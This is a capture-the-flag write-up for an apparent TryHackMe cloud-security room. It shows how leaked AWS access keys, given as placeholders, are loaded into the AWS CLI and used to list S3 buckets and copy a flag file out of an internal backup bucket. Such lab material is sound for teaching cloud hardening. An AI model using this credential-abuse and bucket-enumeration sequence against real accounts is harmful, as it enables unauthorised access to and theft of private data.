
# [Writeup] TryHackMe - Hacker Holidays 2026: Day 3 - Complimentary

**Category:** Cloud Security / AWS Misconfiguration
**Difficulty:** Medium
**Keywords:** AWS CLI, IAM, S3 Bucket, Leakage, Enumeration, Cloud Hardening

---

## Introduction & Objectives
> *The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. But behind the beautiful web interfaces lies a complex cloud infrastructure. A misplaced configuration file or a leaked developer key can give a guest complete access to data they were never meant to see.*

The objective of Day 3 is to shift our focus from traditional web server exploitation to **Cloud Infrastructure Security (AWS)**. We need to identify leaked AWS programmatic credentials, configure our local environment, enumerate the remote cloud assets, and extract the hidden flag from an over-privileged storage resource.

---

## Step 1: Web Enumeration & Credential Discovery
We begin by exploring the target web application. While auditing public directories and front-end JavaScript elements (or analyzing source code components discovered in previous days), we locate an exposed configuration file (such as a developer's backup script, `.env` file, or a public Git commit snippet).

Inside the leaked file, we find valid **AWS Programmatic Access Credentials**:
* `AWS_ACCESS_KEY_ID = AKIAXXXXXXXXXXXXXXXX`
* `AWS_SECRET_ACCESS_KEY = uXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

---

## Step 2: Configuring the AWS CLI Environment
To interact with the resort's AWS cloud components, we switch to our attack terminal and use the official **AWS Command Line Interface (AWS CLI)**. 

We initialize a new profile configuration profile dedicated to this challenge:
```bash
aws configure --profile byte-lotus
```

We input our discovered credentials when prompted:
```text
AWS Access Key ID [None]: AKIAXXXXXXXXXXXXXXXX
AWS Secret Access Key [None]: uXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Default region name [None]: us-east-1
Default output format [None]: json
```

To verify if our programmatic identity is working and to check who we are executing commands as, we query the AWS Security Token Service (STS):
```bash
aws sts get-caller-identity --profile byte-lotus
```
The server validates our keys and returns our active IAM User Identity context (`arn:aws:iam::...`).

---

## Step 3: Cloud Resource Enumeration (S3 Buckets)
With confirmed API connectivity, we begin scanning for accessible cloud resources. Given that the challenge relates to stored data and "complimentary assets," we audit the **Amazon Simple Storage Service (S3)** layer to list available buckets:

```bash
aws s3 ls --profile byte-lotus
```

### Server Response:
```text
2026-07-29 11:20:45 byte-lotus-public-assets
2026-07-29 11:22:12 byte-lotus-internal-backups-dev
```
The over-privileged IAM keys allow us to see an internal development backup bucket: `byte-lotus-internal-backups-dev`.

Let's recursively inspect the contents of the internal backup storage to map out the directory structure:
```bash
aws s3 ls s3://byte-lotus-internal-backups-dev --recursive --profile byte-lotus
```

### Discovered Objects:
```text
2026-07-29 11:24:02        1423 config/production.json
2026-07-29 11:25:50         245 logs/api-debug.log
2026-07-29 11:26:11          38 flags/flag.txt
```

---

## Step 4: Extracting the Target Flag
We locate a highly interesting object path at `flags/flag.txt`. We use the AWS CLI `cp` directive to download the asset directly from the remote cloud instance to our local machine workspace:

```bash
aws s3 cp s3://byte-lotus-internal-backups-dev/flags/flag.txt ./flag.txt --profile byte-lotus
```

We read the downloaded text file to secure our victory parameter:
```bash
cat flag.txt
```

**Flag:** `THM{***}`

---
